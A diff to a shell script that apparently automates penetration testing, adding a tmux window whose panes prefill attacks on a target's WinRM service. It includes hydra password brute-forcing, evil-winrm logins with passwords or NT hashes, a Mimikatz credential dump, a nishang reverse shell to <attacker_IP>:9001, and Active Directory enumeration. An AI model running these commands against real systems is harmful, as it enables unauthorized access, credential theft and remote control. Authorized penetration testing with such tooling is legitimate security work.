@@ -2757,6 +2757,39 @@ tmux send-keys -t PT:31.6 "printf \"\n# Postgres: Navigate DB\n# Get all databas
 tmux send-keys -t PT:31.6 "sqlplus USER/PASS@$ip:1521 as sysdba"
 cd $folderProject
 
+cd $folderProjectAuthN
+# SNMP
+tmux new-window -t PT:32 -n '[5985,5986] WinRM'
+tmux split-window -v -t PT:32.0
+tmux split-window -v -t PT:32.1
+tmux select-pane -t "32.1"
+tmux split-window -h -t "32.1"
+tmux split-window -h -t "32.1"
+tmux split-window -h -t "32.1"
+tmux split-window -v -t PT:32.5
+tmux select-pane -t "32.5"
+tmux split-window -h -t "32.5"
+tmux split-window -h -t "32.5"
+# Esecuzione dei comandi nelle sottofinestre
+tmux send-keys -t PT:32.0 "# WinRM: brute force" Enter
+tmux send-keys -t PT:32.0 "hydra -L users.txt -P passwords.txt $ip winrm && hydra -L users.txt -P users.txt $ip winrm && hydra -l '' -p '' $ip winrm && hydra -l 'dontknow' -p '' $ip winrm"
+tmux send-keys -t PT:32.1 "# WinRM: Shell Activation Credential HTTP" Enter
+tmux send-keys -t PT:32.1 "evil-winrm -u USER -p PASS -i $ip"
+tmux send-keys -t PT:32.2 "# WinRM: Shell Activation CRedential HTTPS" Enter
+tmux send-keys -t PT:32.2 "evil-winrm -S -u USER -p PASS -i $ip"
+tmux send-keys -t PT:32.3 "# WinRM: Shell Activation HASH-NT HTTP" Enter
+tmux send-keys -t PT:32.3 "evil-winrm -u USER -H HASH-NT -i $ip"
+tmux send-keys -t PT:32.4 "# WinRM: Shell Activation HASH-NT HTTPS" Enter
+tmux send-keys -t PT:32.4 "evil-winrm -S -u USER -H HASH-NT -i $ip"
+tmux send-keys -t PT:32.5 "printf \"\n# WinRM: script for dump credentials\n PS> . ./Invoke-Mimikatz.ps1\n PS> Invoke-Mimikatz -Command \\"privilege::debug sekurlsa::logonpasswords\\"\n\n\" " Enter
+tmux send-keys -t PT:32.5 "evil-winrm -i $ip -u USER -p PASS -s /opt/evil-winrm/PowerSploit/Exfiltration"
+tmux send-keys -t PT:32.6 "printf \"\n#  WinRM: script for activate Reverse Shell\n PS> . ./Invoke-PowerShellTcp.ps1\n PS> Invoke-PowerShellTcp -Reverse -IPAddress <attacker_IP> -Port 9001\n\n\" " Enter
+tmux send-keys -t PT:32.6 "evil-winrm -i $ip -u USER -p PASS -s /opt/evil-winrm/nishang/Shells/"
+tmux send-keys -t PT:32.7 "printf \"\n# WinRM: script for Active Directory Enumeration\n PS> Get-NetUser\n PS> Get-NetGroup -GroupName "Domain Admins"\n\n\" " Enter
+tmux send-keys -t PT:32.7 "evil-winrm -i $ip -u USER -p PASS -s /opt/evil-winrm/PowerSploit/Recon/" 
+cd $folderProject
+
+
 # Attivazione della modalità interattiva
 tmux -2 attach-session -t PT
 ;;
